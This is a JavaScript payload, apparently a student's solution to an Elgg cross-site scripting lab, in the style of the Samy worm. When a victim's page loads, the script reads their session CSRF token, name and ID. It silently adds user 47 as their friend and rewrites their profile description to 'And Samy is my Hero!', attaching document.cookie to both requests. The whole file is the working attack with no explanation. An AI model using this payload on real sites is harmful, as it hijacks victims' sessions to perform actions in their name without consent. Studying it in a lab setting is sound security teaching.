window.onload = function() {
	var timestamp = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
	
	var name = "&name=" + elgg.session.user.name;
	var guid = "&guid=" + elgg.session.user.guid;
	if (name === "&name=Samy") {
		return;
	}
	var description = "&description=" + "And Samy is my Hero!";	
	var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + token + timestamp;
	var content = "__elgg_token=" + elgg.security.token.__elgg_token + timestamp + name + description + guid;
	
	var addFriend = new XMLHttpRequest();
	var addText = new XMLHttpRequest();
	function alertContents() {
		if (addText.readyState === XMLHttpRequest.DONE) {
			if (addText.status === 200) {
				alert(addText.responseText);
			} else {
				alert('Bad request');
			}
		}
	}
	//addText.onreadystatechange = alertContents;
	addFriend.open("GET", sendurl, true);
	addFriend.setRequestHeader("Host", "www.xsslabelgg.com");
	addFriend.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0");
	addFriend.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
	addFriend.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	addFriend.setRequestHeader("Accept-Encoding", "gzip, deflate");
	addFriend.setRequestHeader("X-Requested-With", "XMLHTTPRequest");
	addFriend.setRequestHeader("Connection", "keep-alive");
	addFriend.setRequestHeader("Referer", "http://www.xsslabelgg.com/profile/samy");
	addFriend.setRequestHeader("Content-Type", "multipart/form-data");
	addFriend.setRequestHeader("Keep-Alive", "300");
	addFriend.setRequestHeader("Cookie", document.cookie);
	addFriend.send();
	
	addText.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
	addText.setRequestHeader("Host", "www.xsslabelgg.com");
	addText.setRequestHeader("Keep-Alive", "300");
	addText.setRequestHeader("Connection", "keep-alive");
	addText.setRequestHeader("Cookie", document.cookie);
	addText.setRequestHeader("Content-Type", "multipart/form-data");
	addText.send(content);	
}
